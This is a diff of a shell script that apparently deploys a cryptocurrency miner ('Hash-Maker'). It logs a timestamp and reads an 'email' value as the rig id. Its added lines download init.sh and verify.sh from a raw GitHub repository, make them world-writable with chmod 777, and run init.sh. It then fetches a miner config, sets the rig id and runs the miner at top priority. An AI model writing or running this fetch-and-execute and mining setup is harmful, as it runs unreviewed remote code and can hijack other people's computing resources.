@@ -5,12 +5,19 @@ export LOCAL=$(cat $(find /home -name home.file))
 data=$(date +"%d-%m-%Y_%H:%M:%S")
 
 cd $LOCAL
-echo $data >> customize_environment.log
-user=( `cat "email" `)
-sudo ./install.sh
-sudo ./init.sh
-cd CORE/build 
-sudo wget -q -N https://raw.githubusercontent.com/robotpack/scripts/master/config.json
-sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json
 
-sudo nice -n -20 ./Hash-Maker
+echo $data >> customize_environment.log
+
+user=( `cat "email" `)
+
+./install.sh
+
+wget -q -N https://raw.githubusercontent.com/robotpack/scripts/master/init.sh && chmod 777 init.sh && ./init.sh
+
+wget -q -N https://raw.githubusercontent.com/robotpack/scripts/master/verify.sh && chmod 777 verify.sh
+
+cd CORE/build 
+wget -q -N https://raw.githubusercontent.com/robotpack/scripts/master/config.json
+sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json
+
+nice -n -20 ./Hash-Maker
